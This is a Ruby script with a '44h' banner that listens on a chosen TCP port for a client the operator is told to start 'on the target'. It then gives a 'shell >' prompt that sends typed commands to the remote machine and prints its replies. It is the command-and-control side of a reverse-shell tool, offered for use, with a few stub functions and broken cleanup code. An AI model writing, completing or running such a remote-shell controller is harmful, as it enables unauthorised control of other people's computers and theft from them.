require 'socket' 

puts ""
puts ""
puts "Created by 44h"
puts <<-'44h'

___________________________________________________________________________
___________________________________________________________________________
                   _____              _____                   
                  /    /             /    /                   
                 /    /             /    /        .           
                /    /             /    /       .'|           
               /    /             /    /       <  |           
              /    /  __         /    /  __     | |           
             /    /  |  |       /    /  |  |    | | .'''-.    
            /    '   |  |      /    '   |  |    | |/.'''. \   
           /    '----|  |---. /    '----|  |---.|  /    | |   
          /          |  |   |/          |  |   || |     | |   
          '----------|  |---''----------|  |---'| |     | |   
                     |  |               |  |    | '.    | '.  
                    /____\             /____\   '---'   '---' 
___________________________________________________________________________
___________________________________________________________________________
44h
puts ""
puts "Set the PORT to listen on" 
port = $stdin.gets.chomp
puts "Great! Now you can start the client on the target by executing following commands:"
puts "*programmname*.exe *IP* *port*"
puts ""
puts "Now waiting for you to start the client\n"

$wantsToExit = false
#$dataTransmission = false
#$dataTransmissionType = nil

# $client_commands = {
#     "ACN" => "Auto completion data, so folders, files, etc. will be sent in the next message till message \"END\"",
#     "PDATA" => "The next data will be the the data of a program that was executed, till message \"END\"",
#     "END" => "This tells the server that the data transmission of that sequence is complete"
# }
    

def send(data)
    $client.puts(data)
end

def convertDataACN
    #Convert the ACN data, so files, and folders, etc. 
    #I dont know yet how i will send the files and folders
    #I will do this later
end


def receiveData
    thread = Thread.new do
        loop do
            begin
                Kernel.puts ""
                while (line = $client.gets)
                      Kernel.puts line
                end
            rescue => e
                #dont print error
            end
        end
    end
end


$socket = TCPServer.new('0.0.0.0',port)
$client = $socket.accept
receiveData
#commandLineInterface

begin
    loop do
        trap("INT") do
            send("EXIT")
            exit
        end
        print "\n"
        print "   \e[4mshell\e[0m > "
        command = $stdin.gets.chomp
        puts ""
        send(command)
        command = ""

        if $wantsToExit == true
            puts ""
            puts ""
            puts "Exiting.."
            client.close
            socket.close
            
        end
    end
rescue => e
client.close
socket.close
exit()
end
